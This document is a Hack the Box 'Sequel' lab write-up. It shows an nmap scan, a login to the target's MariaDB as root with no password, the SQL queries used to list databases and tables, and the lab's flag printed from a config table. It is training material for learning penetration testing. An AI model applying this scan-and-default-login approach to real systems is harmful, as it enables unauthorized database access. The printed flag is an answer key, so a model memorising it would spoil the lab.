---
layout: default
title: Sequel
parent: Hack the Box Labs
nav_order: 1
---

![[Pasted image 20220222194838.png]]

NMap Scan
```
┌──(ghohst㉿kali)-[~]
└─$ cat sequel.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-22 19:30 MST
Nmap scan report for 10.129.50.73
Host is up (0.060s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsLoadDataLocal, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, SupportsTransactions, ODBCClient, FoundRows, LongColumnFlag, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 8"AbG~cVfzW$J(+;(UW2
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.60 seconds
```

Connected to MySQL Database, with lucky guess of 'root' and no password:
```
┌──(ghohst㉿kali)-[~]
└─$ mysql -h 10.129.50.73 -u root           
```

Show all databases (using mysql cheatsheet for commands), show all tables, select all configs  - flag is within
```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.063 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.062 sec)

MariaDB [htb]> select * from config
    -> select * from config;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select * from config' at line 2
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.060 sec)

```
